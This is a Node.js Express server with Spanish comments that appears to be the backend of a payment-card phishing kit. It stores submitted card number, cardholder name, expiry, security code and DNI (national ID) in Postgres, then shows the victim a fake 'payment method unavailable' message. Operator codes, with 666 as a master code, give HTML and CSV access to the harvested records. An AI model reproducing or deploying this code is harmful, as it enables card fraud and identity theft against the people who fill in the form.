const express = require("express");
const { Pool } = require("pg");
const path = require("path");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL
    ? { rejectUnauthorized: false }
    : false
});

// ======================================================
// CREAR / ACTUALIZAR TABLA
// ======================================================

async function crearTabla() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS registros (
      id SERIAL PRIMARY KEY,
      input1 TEXT,
      input2 TEXT,
      input3 TEXT,
      input4 TEXT,
      input5 TEXT,
      input6 TEXT,
      codigo INTEGER,
      fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  // Si la tabla ya existía antes y no tenía la columna codigo,
  // la agregamos automáticamente.
  await pool.query(`
    ALTER TABLE registros
    ADD COLUMN IF NOT EXISTS codigo INTEGER
  `);
}

crearTabla().catch(console.error);


// ======================================================
// PÁGINA PRINCIPAL
// ======================================================

app.get("/", (req, res) => {

  let codigo = parseInt(req.query.codigo, 10);

  // Si no viene código, usar 666
  if (!Number.isInteger(codigo)) {
    codigo = 666;
  }

  res.sendFile(
    path.join(__dirname, "public", "index.html")
  );
});

// ======================================================
// GUARDAR REGISTRO
// ======================================================

app.post("/error", async (req, res) => {

  try {

    const {
      input1,
      input2,
      input3,
      input4,
      input5,
      input6
    } = req.body;

    /*
     * El código puede venir desde un campo oculto
     * del formulario.
     */

    const codigo = parseInt(req.body.codigo, 10);

    if (!Number.isInteger(codigo)) {

      return res.status(400).send(`
        <h1>Error</h1>
        <p>Código de acceso inválido.</p>
      `);

    }

    // --------------------------------------------------
    // GUARDAR
    // --------------------------------------------------

    await pool.query(
      `
      INSERT INTO registros
      (
        input1,
        input2,
        input3,
        input4,
        input5,
        input6,
        codigo
      )
      VALUES ($1, $2, $3, $4, $5, $6, $7)
      `,
      [
        input1,
        input2,
        input3,
        input4,
        input5,
        input6,
        codigo
      ]
    );


    // --------------------------------------------------
    // MENSAJE
    // --------------------------------------------------

    res.send(`
      <!DOCTYPE html>

      <html lang="es">

      <head>

        <meta charset="UTF-8">

        <title>No disponible</title>

        <style>

          body {
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            height: 100vh;
            margin: 0;

            display: flex;
            justify-content: center;
            align-items: center;
          }

          .cartel {
            background: white;
            padding: 40px;

            border-radius: 12px;

            box-shadow:
              0 0 15px rgba(0,0,0,.2);

            text-align: center;
          }

        </style>

      </head>

      <body>

        <div class="cartel">

          <h1>
            MEDIO DE PAGO NO DISPONIBLE.
            INTENTÉ NUEVAMENTE
          </h1>

        </div>

      </body>

      </html>
    `);

  } catch (error) {

    console.error(error);

    res.status(500).send(
      "Error al guardar los datos"
    );

  }

});


// ======================================================
// LEER REGISTROS
// ======================================================


app.get("/leer", async (req, res) => {
  try {
    const codigo = parseInt(req.query.codigo, 10);

    if (!Number.isInteger(codigo)) {
      return res.status(400).send("Código de acceso inválido");
    }

    let resultado;

    if (codigo === 666) {
      // 666 = mostrar todos los registros
      resultado = await pool.query(`
        SELECT *
        FROM registros
        ORDER BY id DESC
      `);
    } else {
      // Cualquier otro código = mostrar solamente ese código
      resultado = await pool.query(
        `
        SELECT *
        FROM registros
        WHERE codigo = $1
        ORDER BY id DESC
        `,
        [codigo]
      );
    }

    let filas = "";

    resultado.rows.forEach(r => {
      filas += `
        <tr>
          <td>${r.id}</td>
          <td>${r.codigo || ""}</td>
          <td>${r.input1 || ""}</td>
          <td>${r.input2 || ""}</td>
          <td>${r.input3 || ""}</td>
          <td>${r.input5 || ""}</td>
          <td>${r.input6 || ""}</td>
          <td>${r.fecha ? new Date(r.fecha).toLocaleString("es-AR") : ""}</td>
        </tr>
      `;
    });

    const titulo =
      codigo === 666
        ? "Todos los registros"
        : `Registros del código ${codigo}`;

    res.send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <title>${titulo}</title>

        <style>
          body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background: #f5f5f5;
          }

          table {
            border-collapse: collapse;
            width: 100%;
            background: white;
          }

          th, td {
            border: 1px solid #ccc;
            padding: 8px;
            text-align: left;
          }

          th {
            background: #222;
            color: white;
          }

          button {
            padding: 10px 15px;
            margin-bottom: 15px;
            cursor: pointer;
          }
        </style>
      </head>

      <body>

        <h2>${titulo}</h2>

        <p>
          Cantidad de registros: ${resultado.rows.length}
        </p>

        <a href="/descargar-csv?codigo=${codigo}">
          <button>📥 Descargar CSV</button>
        </a>

        <table>
          <tr>
            <th>ID</th>
            <th>Código</th>
            <th>Numero</th>
            <th>Nombre</th>
            <th>Vence</th>
            <th>Codigo</th>
            <th>DNI</th>
            <th>Fecha</th>
          </tr>

          ${filas}

        </table>

      </body>
      </html>
    `);

  } catch (error) {
    console.error(error);
    res.status(500).send("Error al leer los registros");
  }
});




// ======================================================
// DESCARGAR CSV
// ======================================================

app.get("/descargar-csv", async (req, res) => {
  try {
    const codigo = parseInt(req.query.codigo, 10);

    if (!Number.isInteger(codigo)) {
      return res.status(400).send("Código de acceso inválido");
    }

    let resultado;

    if (codigo === 666) {
      // 666 = todos
      resultado = await pool.query(`
        SELECT *
        FROM registros
        ORDER BY id DESC
      `);
    } else {
      // Código específico
      resultado = await pool.query(
        `
        SELECT *
        FROM registros
        WHERE codigo = $1
        ORDER BY id DESC
        `,
        [codigo]
      );
    }

    let csv = "ID,Codigo,Numero,Nombre,Vence,Codigo,DNI,Fecha\n";

    resultado.rows.forEach(r => {
      csv += `"${r.id || ""}","${r.codigo || ""}","${r.input1 || ""}","${r.input2 || ""}","${r.input3 || ""}","${r.input5 || ""}","${r.input6 || ""}","${r.fecha || ""}"\n`;
    });

    res.setHeader(
      "Content-Disposition",
      `attachment; filename=registros_${codigo}.csv`
    );

    res.setHeader(
      "Content-Type",
      "text/csv; charset=utf-8"
    );

    res.send(csv);

  } catch (error) {
    console.error(error);
    res.status(500).send("Error al generar CSV");
  }
});





// ======================================================
// SERVIDOR
// ======================================================

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {

  console.log(
    "Servidor activo en puerto " + PORT
  );

});
